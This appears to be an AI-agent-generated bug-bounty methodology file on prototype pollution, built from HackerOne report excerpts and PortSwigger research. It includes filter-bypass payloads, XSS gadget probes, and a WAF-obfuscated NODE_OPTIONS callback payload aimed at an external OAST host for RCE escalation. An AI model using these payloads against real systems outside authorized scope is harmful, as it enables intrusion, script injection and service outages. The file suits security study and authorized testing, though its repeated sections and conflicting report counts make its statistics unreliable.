---
name: bbhunt-prototype-pollution
description: "Use for __proto__/constructor.prototype injection in JSON bodies, query parsing, and merge/clone utilities, and for client-side gadget exploitation. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Prototype Pollution — unified methodology

> **Methodology skill.** Merged from 2 upstream skills across h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.

## Corpus signal — 14 valid reports (0 paid / 0%)

Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| public source-code / repo review | 9 |
| HTTP method / verb tampering | 2 |
| deserialization / gadget chain | 1 |
| third-party data / paste / breach reuse | 1 |
| file upload / filename / extension | 1 |
| mass assignment / extra request fields | 1 |

## Corpus-backed method (this class)

1. Identify the parsing and merge path for JSON/query/body input; test whether special keys survive parsing.
2. Confirm pollution with a harmless property and an observable side effect (an object gaining an unexpected property).
3. Fingerprint libraries and versions to find real gadgets; a polluted property alone is not impact.
4. For client-side pollution, look for sinks in DOM APIs, template engines, and option objects.
5. Prove a security consequence: auth/property override, XSS gadget, or RCE where the stack supports it.

### Signals

- JavaScript/Node stack with merge/extend/clone utilities
- JSON keys accepted verbatim, including __proto__ or constructor
- Framework gadgets that read polluted properties

### Kill criteria

- Parser strips or blocks special keys at every entry point.
- Pollution occurs but no gadget turns it into a security effect.
- Only a local Node process you cannot influence as an attacker.

### Escalation chains

- Prototype pollution -> property override -> auth bypass.
- Client pollution -> DOM gadget -> XSS.

### Veteran tip

Gadget discovery is the whole game — fingerprint the framework before spending time on payload variants.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method
### Quick wins

Start here. These are the highest-yield tests for this class.

- Find recursive merge/clone helpers and query parsers (jQuery.extend, lodash.merge, qs).
- Try __proto__, constructor.prototype, and prototype in query strings, JSON, cookies.
- Confirm pollution with `({}).polluted` and a downstream gadget.
- Test server-side Node.js merge paths too.

### Deeper checklist

- Find recursive merge/clone helpers and query-string parsers (jQuery.extend, lodash.merge, qs, yargs).
- Try `__proto__`, `constructor.prototype`, and `prototype` in query strings, JSON bodies, and cookies.
- Confirm pollution via `({}).polluted` in the console or a downstream gadget.
- Chain to XSS (DOM sinks), auth bypass, or DoS via polluted options.
- Test server-side Node.js merge paths as well as browser bundles.
- Check library versions against known prototype-pollution CVEs.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Work the **source → gadget → sink** model explicitly (OWASP WSTG / PortSwigger). Pollution alone is rarely a finding: you need (1) an input that reaches a recursive merge/clone/path-assignment, and (2) code that later reads the planted property and uses it in a sensitive sink.
- Client-side source probes, in order (PortSwigger Academy): append each to every interesting URL and inspect `Object.prototype` in the console:
  - `/?__proto__[foo]=bar` (bracket notation)
  - `/?__proto__.foo=bar` (dot notation)
  - `/#__proto__[foo]=bar` (hash/fragment routes)
  - postMessage bodies carrying `{"__proto__":{"foo":"bar"}}`
  - JSON body reflection: `{"__proto__":{"foo":"bar"}}` on profile/settings/config endpoints.
- If `__proto__` is filtered, try the **constructor path** — every non-null-prototype object exposes `constructor.prototype`: `?constructor[prototype][foo]=bar`, `?constructor.prototype.foo=bar`. This defeats the common "strip `__proto__` key" defense.
- If keys are sanitized once, try **recursive-stripping bypass**: `__pro__proto__to__.gadget=payload` reduces to `__proto__.gadget=payload` when the sanitizer removes `__proto__` a single time. Also try URL-encoded, double-encoded, and Unicode-variant forms (`%5f%5fproto%5f%5f`, `\u005f\u005fproto\u005f\u005f`).
- Library fingerprints to grep JS bundles for: `_.merge`, `_.defaultsDeep`, `_.set`, `_.setWith`, `jQuery.extend(true,...)`, `lodash.merge`, `Object.assign`, `$.extend`, `merge` from `deepmerge`, `mergeWith`. Check versions: lodash < 4.17.5 (`merge`/`set`/`defaultsDeep`), CVE-2018-3721 / CVE-2019-10744 fixed in 4.17.11; some ≥4.17.12 builds still allow `constructor.prototype`.
- Server-side sources are most often **JSON body merge endpoints**: address/profile update, preferences, settings, search filters, import/config upload. Look for `JSON.parse()` followed by a merge — `JSON.parse` creates `__proto__` as an *own* property, which a vulnerable merge then reinterprets as a setter.
- DOM Invader (Burp built-in browser): enable Prototype pollution under Attack types, reload, use **Test** to verify the source, then **Scan for gadgets** and let it auto-generate an `alert()` PoC. It covers query string, hash, and web-message JSON automatically — far faster than reading minified bundles.
- Third-party **gadget** hotspots from PortSwigger Research: Google Analytics `hitCallback` → `setTimeout`; Google Tag Manager `sequence` → `eval`, `event_callback` → `setTimeout`; Adobe DTM `cspNonce` and `bodyHiddenStyle` → `innerHTML`, `trackingServerSecure` → `script.src` (host controllable). A site can be vulnerable through a library it never wrote.### Signals and surfaces
### Signal

- Reports: **59** · paid: **2**
- Median bounty **$3,000** · p90 **$3,000** · max **$3,000** · total **$6,000**
- Median upvotes **5**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $6,000 | 106 |
| Node.js third-party modules | 47 | $0 | 260 |
| Node.js | 4 | $0 | 49 |
| ExpressionEngine | 2 | $0 | 51 |
| Elastic | 1 | $0 | 157 |
| 8x8 | 1 | $0 | 17 |
| Stripe | 1 | $0 | 17 |
| Automattic | 1 | $0 | 7 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`query string` `JSON body` `cookies` `config` `merge`### Techniques and bypasses
### Payloads & probes

- `?__proto__[polluted]=yes` `?constructor[prototype][polluted]=yes`
- `{"__proto__":{"isAdmin":true}}`
- `a[__proto__][x]=1` in qs/body-parser

### Bypass tricks

- Bypass filters with `constructor.prototype` and nested keys.
- Chain to DOM XSS via polluted options.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)** — `#998398` · Elastic · $0 · ▲157
  > https://blog.swiftype.com/ proto [asd]=alert(document.domain)
- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1106238` · GitLab · $3,000 · ▲58
  > Syntax for declaring the directive is `%%{init: {<JSON OBJECT }}%%`
- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1280002` · GitLab · $3,000 · ▲48
  > Open https://gitlab.com/cataha319/stored-xss/-/issues/2
- **Type Juggling -> PHP Object Injection -> SQL Injection Chain** — `#202774` · ExpressionEngine · $0 · ▲40
  > The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/
- **property-expr - Prototype pollution** — `#910206` · Node.js third-party modules · $0 · ▲33
  > npm page: `https://www.npmjs.com/package/property-expr`
- **Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)** — `#3560402` · Node.js · $0 · ▲22
  > When this occurs, `dest[" proto "]` resolves to `Object.prototype` rather than `undefined`, causing `.push()` to be called on a non-array.
- **Prototype pollution attack (lodash)** — `#712065` · Node.js third-party modules · $0 · ▲20
  > npm page: https://www.npmjs.com/package/lodash
- **Jitsi: Bridge Message Spoofing due to Improper JSON Handling leads to Prototype Pollution** — `#2095061` · 8x8 · $0 · ▲17
  > https://github.com/jitsi/security-advisories/blob/master/advisories/JSA-2023-0001.md
- **Object injection in `stripe-billing-typographic` GitHub project via /auth/login** — `#1183335` · Stripe · $0 · ▲17
  > The vulnerable code is: https://github.com/stripe/stripe-billing-typographic
- **Prototype pollution via console.table properties** — `#1431042` · Node.js · $0 · ▲16
  > The vulnerable assignment can be found [here](https://github.com/nodejs/node/blob/3f7dabdfdc9e2a3cd3f92e377755c0dd43f6751b/lib/internal/console/constructor.js L576) in the Node.js `console.table` implementation.
- **Prototype pollution attack (lodash / constructor.prototype)** — `#380873` · Node.js third-party modules · $0 · ▲15
  > The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype.
- **[nested-property] Prototype Pollution** — `#788883` · Node.js third-party modules · $0 · ▲14
  > https://media1.tenor.com/images/dc2899b4432861e0ce1b9a03d8c98719/tenor.gif
- **[i18next] Prototype pollution attack** — `#968355` · Node.js third-party modules · $0 · ▲11
  > The i18next API provides a function `addResourceBundle` in [src/ResourceStore.js:79](https://github.com/i18next/i18next/blob/master/src/ResourceStore.js L79) (see API docs [here](https://www.i18next.com/overview/api addresourcebundle)).
- **Prototype pollution in multipart parsing** — `#804772` · Node.js third-party modules · $0 · ▲11
  > npm page: `https://www.npmjs.com/package/fastify-multipart`
- **Prototype pollution attack (lodash)** — `#310443` · Node.js third-party modules · $0 · ▲11
  > var malicious payload = '{"\ \ proto\ \ ":{"oops":"It works !"}}';
- **Prototype pollution in dot-prop** — `#719856` · Node.js third-party modules · $0 · ▲10
  > npm page: https://www.npmjs.com/package/dot-prop
- **Prototype Pollution lodash 4.17.15** — `#864701` · Node.js third-party modules · $0 · ▲9
  > npm page: `https://www.npmjs.com/package/lodash`
- **Prototype pollution attack (merge.recursive)** — `#381194` · Node.js third-party modules · $0 · ▲9
  > Craft an object of form `{ proto : {...}}` and send it to `merge.recursive`.
- **The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1** — `#1877919` · Node.js · $0 · ▲8
  > But the use of \ \ proto\ \ in process.mainModule.\ \ proto\ \ .require() can bypass the check.
- **SQL Injection or Denial of Service due to a Prototype Pollution** — `#869574` · Node.js third-party modules · $0 · ▲8
  > The mentioned function, as we can see from the code, doesn't account for built-in properties such as ` proto `, causing pollution of the `Object` prototype when a specially crafted object is passed in the rest argument `...sources`.
- **Prototype pollution attack through jQuery $.extend** — `#454365` · Node.js third-party modules · $0 · ▲8
  > Craft an object with a named ` proto ` property, usually through `JSON.parse`, and pass it to `$.extend`:
- **[klona] Prototype pollution** — `#778414` · Node.js third-party modules · $0 · ▲7
  > npm page: `https://www.npmjs.com/package/klona`
- **Object Injection in Woocommerce / Handle PDT Responses from PayPal** — `#245228` · Automattic · $0 · ▲7
  > but the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var unserializer.c) function supports little `o` as option in it and it is a StdClass object.
- **Prototype pollution attack (defaults-deep / constructor.prototype)** — `#380878` · Node.js third-party modules · $0 · ▲7
  > Craft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:
- **Prototype Pollution Vulnerability in mpath Package** — `#390860` · Node.js third-party modules · $0 · ▲6
  > npm page: `https://www.npmjs.com/package/mpath`
- **Prototype pollution attack (lutils-merge)** — `#439107` · Node.js third-party modules · $0 · ▲6
  > npm page: `https://www.npmjs.com/package/lutils-merge`
- **[json8-merge-patch] Prototype Pollution** — `#980649` · Node.js third-party modules · $0 · ▲5
  > I would like to report a `Prototype Pollution` vulnerability in `json8-merge-patch`
- **[extend-merge] Prototype pollution** — `#878339` · Node.js third-party modules · $0 · ▲5
  > I would like to report a `prototype pollution` vulnerability in `extend-merge` module.
- **Prototype pollution attack (extend)** — `#381185` · Node.js third-party modules · $0 · ▲5
  > Craft an object of form `{ proto : {...}}` and send it to `extend(true, {}, ...)`.
- **Prototype Pollution Vulnerability in noble Package** — `#390857` · Node.js third-party modules · $0 · ▲4
  > npm page: `https://www.npmjs.com/package/noble`

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 15× | `__proto__` |
| 4× | `{__proto__: {...}}` |
| 4× | `$.extend` |
| 3× | `{constructor: {prototype: {...}}}` |
| 3× | `@firebase/util` |
| 2× | `%%{init: { '__proto__': {'polluted': 'asdf'}} }%% / sequenceDiagram / Alice->>Bob: Hi Bob / Bob->>Alice: Hi Alice` |
| 2× | `fix(misc) use safeJsonParse from js-utils` |
| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |
| 2× | `__proto__.polluted` |
| 1× | `%%{init: {<JSON_OBJECT>}}%%` |
| 1× | `\n${cnf.themeCSS}` |
| 1× | `\n:root { --mermaid-font-family: ${cnf.fontFamily}}` |
| 1× | `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}` |
| 1× | `let expr = require('property-expr') / obj = {} / expr.setter('constructor.prototype.isAdmin')(obj,true) / console.log({}.isAdmin) // true` |
| 1× | `dest["__proto__"]` |
| 1× | `.push()` |
| 1× | `ref: Cleanup BridgeChannelMessage (remove unnecessary type field).` |
| 1× | `POST /auth/login / {"email":{"email":1},"password":"1234"}` |
| 1× | `> console.table({a: 1, b: 1, c: 1}, ['__proto__']) / Uncaught TypeError: Cannot create property '0' on string '' / > Object.prototype / [Obj` |
| 1× | `const keys = properties \\|\\| ObjectKeys(item); / for (const key of keys) { / + if (key === '__proto__') { / + continue / + } / if (map[key]` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Manual source confirmation: `Object.prototype.foo` in DevTools returns `"bar"` → polluted; `undefined` → not. Never infer success from the page's visible behavior alone.
- Browser-API gadgets (PortSwigger "Widespread prototype pollution gadgets"):
  - `Object.prototype.body="foo=bar"; fetch('/', {method:"POST"})` — controls the options object the site doesn't fully populate.
  - `Object.defineProperty` descriptor poisoning via `Object.prototype.value`: even a `writable:false, configurable:false` property can be overwritten if the descriptor omits `value`.
  - `Object.prototype.configurable = true` can make a property redefinable → possible sandbox escape.
  - `localStorage.foo` (property access) inherits the polluted value; `localStorage.get('foo')` does not.
- Lab-grade client PoC: `/?__proto__[transport_url]=data:,alert(1);` where an undefined `config.transport_url` flows into a dynamically appended `<script src>`; GTM's `sequence` needs a trailing `-` because it lands in a numeric JS expression (`?__proto__[sequence]=alert(document.domain)-`).
- **Server-side, non-destructive detection** (PortSwigger Research, use these — a naive pollution can persist for the whole Node process and DoS the app):
  - `{"__proto__":{"json spaces":" "}}` → later JSON responses gain indentation (Express ≤ 4.17.3).
  - `{"__proto__":{"exposedHeaders":["foo"]}}` → response gains `Access-Control-Expose-Headers: foo` (requires CORS module).
  - `{"__proto__":{"status":555}}` → pick an obscure 4xx/5xx; force an error (break JSON), observe the error object's `status`/`statusCode` change to 555. Reliable and reversible.
  - `{"__proto__":{"head":true}}` → `OPTIONS` response drops `HEAD` from the allowed-methods list.
  - `{"__proto__":{"allowDots":true}}` → `?foo.bar=baz` starts building nested objects; also a chain primitive.
  - `{"__proto__":{"parameterLimit":1}}` → second query param disappears from reflection; choose a high value to avoid breaking the app.
  - `{"__proto__":{"content-type":"text/html; charset=UTF-7"}}` → UTF-7 decoding of a previously inert reflected value (body-parser gadget).
- **JSON-reflection probes** (when no framework gadget exists):
  - `{"unusualName":"value","__proto__":"test"}` — if `unusualName` is reflected but `__proto__` is not, and the value persists after removal, suspect pollution.
  - Lodash-specific: `{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}` — if only `b` is reflected, that confirms `key in object` is seeing the polluted prototype (the inherited `a` is skipped by `assignMergeValue`).
- **Immutable-prototype generic probe**: assigning a primitive to `__proto__.__proto__` is a no-op, assigning an object throws a TypeError. Trigger the difference through library path traversal (Blitz-style `referentialEqualities: {"path": ["__proto__.targetKey"]}`) to detect pollution without a console.
- **OAST escalation primitive** (Gareth Heyes): `{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"}}` → DNS callback if a Node sink such as `exec`/`fork` is reachable; the doubled quotes obfuscate the host from WAF scrapers. This is both a detector and an RCE path (devtools inspector).
- Express XSS escalation: `{"__proto__":{"_body":true,"body":"<script>evil()</script>"}}` with `res.send(obj)` can flip the content-type to HTML and reflect the payload — destructive/persistent, so only use on lab or owned targets, or after confirming with a safe probe first.
- `{"__proto__":{"ignoreQueryPrefix":true}}` and `allowDots` are quieter chain primitives for cache-poisoning / parameter-smuggling follow-ups.### Validation and proof
### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never start with a destructive probe.** Server-side pollution lasts for the lifetime of the Node process; a bad `encoding`, `Object.keys`, or `body` pollution can take the app down for everyone. Always begin with `status`, `json spaces`, `exposedHeaders`, or `OPTIONS` probes and a unique probe value.
- Confirm on a **second, independent request** after the polluting request (pollution must persist across requests), and confirm the change reverts when the polluting property is removed where possible. A one-off reflection is not pollution.
- For client-side, require both halves: a verified polluted property *and* a gadget reaching a real sink (`innerHTML`, `eval`, `script.src`, `setTimeout`, `fetch`). A polluted `Object.prototype` with no reachable gadget is typically closed as informational — say so in the report rather than claiming XSS.
- Prefer DOM Invader's Exploit-generated `alert()` as the client proof; for server-side, capture before/after response pairs (header set, status code, JSON indentation) with the exact polluting body.
- For RCE/OAST claims, require an actual Collaborator/DNS interaction tied to a unique token, not a WAF that scrapes hostnames. The doubled-quote obfuscated payload reduces that false positive.
- Third-party gadget findings: name the library and version and show the site loads it; Google has historically declined to fix GTM/GA gadgets, arguing it's the site's responsibility to avoid pollution sources — report to the site.
- Avoid the classic false positive: `hasOwnProperty` behavior on `JSON.parse` objects differs from object literals. `{"__proto__":"x"}` being *reflected* is not pollution — it's just a JSON key. Use the persistence and framework-effect probes above.
- Clean up lab state by restarting the Node process between experiments; on real targets, stop after one non-destructive confirmation and do not attempt to "un-pollute" by overwriting with junk values.### Escalation and related chains
### Escalation chains

- Prototype pollution -> DOM XSS.
- Prototype pollution -> auth bypass.

### Type Juggling -> PHP Object Injection -> SQL Injection Chain

`#202774` · ExpressionEngine · $0 · n/a · 2017-02-07 · ▲40
> Justin Kennedy identified a Type Juggling vulnerability in ExpressionEngine that allowed access to unserialize using user supplied data, ultimately achieving SQL Injection. The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/### Tools
### Tools

`Burp` · `DOM Invader` · `ppmap` · `browser console`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_prototype-pollution.txt` | 52 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_prototype-pollution.txt \
     -mc all -fc 404 -fs 0 -rate 40
```

### Nuclei

Scanner coverage is minimal; test merge/query parsers and confirm a downstream gadget.

```sh
nuclei -u https://target -tags prototype-pollution \
       -severity low,medium,high,critical -rl 40 -o nuclei_prototype-pollution.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Sources and related reading
### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class prototype-pollution --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class prototype-pollution
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class prototype-pollution
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class prototype-pollution --min-bounty 1000
```

### Related

- `hackerone-xss` (2,569 reports)
- `hackerone-rce` (1,399 reports)
- `hackerone-logic-and-design` (931 reports)

### Related

- `xss` (2,569 reports)
- `rce` (1,399 reports)
- `logic-and-design` (931 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/server-side-prototype-pollution
2. https://portswigger.net/research/widespread-prototype-pollution-gadgets
3. https://portswigger.net/blog/finding-client-side-prototype-pollution-with-dom-invader
4. https://portswigger.net/web-security/prototype-pollution/client-side
5. https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
6. https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
7. https://wstg.owasp.org/latest/11-Injection/21-Prototype_Pollution/
8. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html
9. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html### Additional notes
### Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)

`#998398` · Elastic · $0 · high · 2021-08-16 · ▲157
> Summary: deparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js is vulnerable to prototype pollution. There is a script gadget in the same js file which leads to XSS. Steps To Reproduce: Visit (Refresh if you don't see a pop up) https://blog.swiftype.com/ proto [asd]=alert(document.domain) Root Cause https://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.

### Stored XSS via Mermaid Prototype Pollution vulnerability

`#1106238` · GitLab · $3,000 · high · 2021-07-12 · ▲58
> The issue is that directive JSON OBJECT is lacking proper sanitization which means we can specify proto attribute to overwrite Object prototype. For example, if we use following payload, it will add attribute polluted to every new object in the application: I have tried to use it to overwrite config values or other attributes to achieve XSS, but since a new attribute will be accessible in every object, it just breaks the application.

### property-expr - Prototype pollution

`#910206` · Node.js third-party modules · $0 · high · 2020-09-24 · ▲33
> Tiny property path utilities, including path parsing and metadata and deep property setters and getters

### Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)

`#3560402` · Node.js · $0 · high · 2026-03-30 · ▲22
> A flaw in Node.js HTTP request handling causes an uncaught TypeError when a request is received with a header named proto and the application accesses req.headersDistinct. When this occurs, dest[" proto "] resolves to Object.prototype rather than undefined, causing .push() to be called on a non-array.### Companion methodology (deduplicated)
### hunting / references/techniques.md

# Prototype Pollution & Client-Side Object Injection — HackerOne field guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find recursive merge/clone helpers and query parsers (jQuery.extend, lodash.merge, qs).

- Try __proto__, constructor.prototype, and prototype in query strings, JSON, cookies.

- Confirm pollution with `({}).polluted` and a downstream gadget.

- Test server-side Node.js merge paths too.



## Bypass tricks



- Bypass filters with `constructor.prototype` and nested keys.

- Chain to DOM XSS via polluted options.



## Deeper checklist



- Find recursive merge/clone helpers and query-string parsers (jQuery.extend, lodash.merge, qs, yargs).

- Try `__proto__`, `constructor.prototype`, and `prototype` in query strings, JSON bodies, and cookies.

- Confirm pollution via `({}).polluted` in the console or a downstream gadget.

- Chain to XSS (DOM sinks), auth bypass, or DoS via polluted options.

- Test server-side Node.js merge paths as well as browser bundles.

- Check library versions against known prototype-pollution CVEs.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)** — `#998398` · Elastic · $0 · ▲157

  > https://blog.swiftype.com/ proto [asd]=alert(document.domain)

- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1106238` · GitLab · $3,000 · ▲58

  > Syntax for declaring the directive is `%%{init: {<JSON OBJECT }}%%`

- **Stored XSS via Mermaid Prototype Pollution vulnerability** — `#1280002` · GitLab · $3,000 · ▲48

  > Open https://gitlab.com/cataha319/stored-xss/-/issues/2

- **Type Juggling -> PHP Object Injection -> SQL Injection Chain** — `#202774` · ExpressionEngine · $0 · ▲40

  > The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/

- **property-expr - Prototype pollution** — `#910206` · Node.js third-party modules · $0 · ▲33

  > npm page: `https://www.npmjs.com/package/property-expr`

- **Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)** — `#3560402` · Node.js · $0 · ▲22

  > When this occurs, `dest[" proto "]` resolves to `Object.prototype` rather than `undefined`, causing `.push()` to be called on a non-array.

- **Prototype pollution attack (lodash)** — `#712065` · Node.js third-party modules · $0 · ▲20

  > npm page: https://www.npmjs.com/package/lodash

- **Jitsi: Bridge Message Spoofing due to Improper JSON Handling leads to Prototype Pollution** — `#2095061` · 8x8 · $0 · ▲17

  > https://github.com/jitsi/security-advisories/blob/master/advisories/JSA-2023-0001.md

- **Object injection in `stripe-billing-typographic` GitHub project via /auth/login** — `#1183335` · Stripe · $0 · ▲17

  > The vulnerable code is: https://github.com/stripe/stripe-billing-typographic

- **Prototype pollution via console.table properties** — `#1431042` · Node.js · $0 · ▲16

  > The vulnerable assignment can be found [here](https://github.com/nodejs/node/blob/3f7dabdfdc9e2a3cd3f92e377755c0dd43f6751b/lib/internal/console/constructor.js L576) in the Node.js `console.table` implementation.

- **Prototype pollution attack (lodash / constructor.prototype)** — `#380873` · Node.js third-party modules · $0 · ▲15

  > The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype.

- **[nested-property] Prototype Pollution** — `#788883` · Node.js third-party modules · $0 · ▲14

  > https://media1.tenor.com/images/dc2899b4432861e0ce1b9a03d8c98719/tenor.gif

- **[i18next] Prototype pollution attack** — `#968355` · Node.js third-party modules · $0 · ▲11

  > The i18next API provides a function `addResourceBundle` in [src/ResourceStore.js:79](https://github.com/i18next/i18next/blob/master/src/ResourceStore.js L79) (see API docs [here](https://www.i18next.com/overview/api addresourcebundle)).

- **Prototype pollution in multipart parsing** — `#804772` · Node.js third-party modules · $0 · ▲11

  > npm page: `https://www.npmjs.com/package/fastify-multipart`

- **Prototype pollution attack (lodash)** — `#310443` · Node.js third-party modules · $0 · ▲11

  > var malicious payload = '{"\ \ proto\ \ ":{"oops":"It works !"}}';

- **Prototype pollution in dot-prop** — `#719856` · Node.js third-party modules · $0 · ▲10

  > npm page: https://www.npmjs.com/package/dot-prop

- **Prototype Pollution lodash 4.17.15** — `#864701` · Node.js third-party modules · $0 · ▲9

  > npm page: `https://www.npmjs.com/package/lodash`

- **Prototype pollution attack (merge.recursive)** — `#381194` · Node.js third-party modules · $0 · ▲9

  > Craft an object of form `{ proto : {...}}` and send it to `merge.recursive`.

- **The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1** — `#1877919` · Node.js · $0 · ▲8

  > But the use of \ \ proto\ \ in process.mainModule.\ \ proto\ \ .require() can bypass the check.

- **SQL Injection or Denial of Service due to a Prototype Pollution** — `#869574` · Node.js third-party modules · $0 · ▲8

  > The mentioned function, as we can see from the code, doesn't account for built-in properties such as ` proto `, causing pollution of the `Object` prototype when a specially crafted object is passed in the rest argument `...sources`.

- **Prototype pollution attack through jQuery $.extend** — `#454365` · Node.js third-party modules · $0 · ▲8

  > Craft an object with a named ` proto ` property, usually through `JSON.parse`, and pass it to `$.extend`:

- **[klona] Prototype pollution** — `#778414` · Node.js third-party modules · $0 · ▲7

  > npm page: `https://www.npmjs.com/package/klona`

- **Object Injection in Woocommerce / Handle PDT Responses from PayPal** — `#245228` · Automattic · $0 · ▲7

  > but the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var unserializer.c) function supports little `o` as option in it and it is a StdClass object.

- **Prototype pollution attack (defaults-deep / constructor.prototype)** — `#380878` · Node.js third-party modules · $0 · ▲7

  > Craft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:

- **Prototype Pollution Vulnerability in mpath Package** — `#390860` · Node.js third-party modules · $0 · ▲6

  > npm page: `https://www.npmjs.com/package/mpath`

- **Prototype pollution attack (lutils-merge)** — `#439107` · Node.js third-party modules · $0 · ▲6

  > npm page: `https://www.npmjs.com/package/lutils-merge`

- **[json8-merge-patch] Prototype Pollution** — `#980649` · Node.js third-party modules · $0 · ▲5

  > I would like to report a `Prototype Pollution` vulnerability in `json8-merge-patch`

- **[extend-merge] Prototype pollution** — `#878339` · Node.js third-party modules · $0 · ▲5

  > I would like to report a `prototype pollution` vulnerability in `extend-merge` module.

- **Prototype pollution attack (extend)** — `#381185` · Node.js third-party modules · $0 · ▲5

  > Craft an object of form `{ proto : {...}}` and send it to `extend(true, {}, ...)`.

- **Prototype Pollution Vulnerability in noble Package** — `#390857` · Node.js third-party modules · $0 · ▲4

  > npm page: `https://www.npmjs.com/package/noble`



## Case studies



### Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)

`#998398` · Elastic · $0 · high · 2021-08-16 · ▲157

> Summary: deparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js is vulnerable to prototype pollution. There is a script gadget in the same js file which leads to XSS. Steps To Reproduce: Visit (Refresh if you don't see a pop up) https://blog.swiftype.com/ proto [asd]=alert(document.domain) Root Cause https://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.



### Stored XSS via Mermaid Prototype Pollution vulnerability

`#1106238` · GitLab · $3,000 · high · 2021-07-12 · ▲58

> The issue is that directive JSON OBJECT is lacking proper sanitization which means we can specify proto attribute to overwrite Object prototype. For example, if we use following payload, it will add attribute polluted to every new object in the application: I have tried to use it to overwrite config values or other attributes to achieve XSS, but since a new attribute will be accessible in every object, it just breaks the application.



### Type Juggling -> PHP Object Injection -> SQL Injection Chain

`#202774` · ExpressionEngine · $0 · n/a · 2017-02-07 · ▲40

> Justin Kennedy identified a Type Juggling vulnerability in ExpressionEngine that allowed access to unserialize using user supplied data, ultimately achieving SQL Injection. The full details of this vulnerability can be found here: https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/



### property-expr - Prototype pollution

`#910206` · Node.js third-party modules · $0 · high · 2020-09-24 · ▲33

> Tiny property path utilities, including path parsing and metadata and deep property setters and getters



### Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)

`#3560402` · Node.js · $0 · high · 2026-03-30 · ▲22

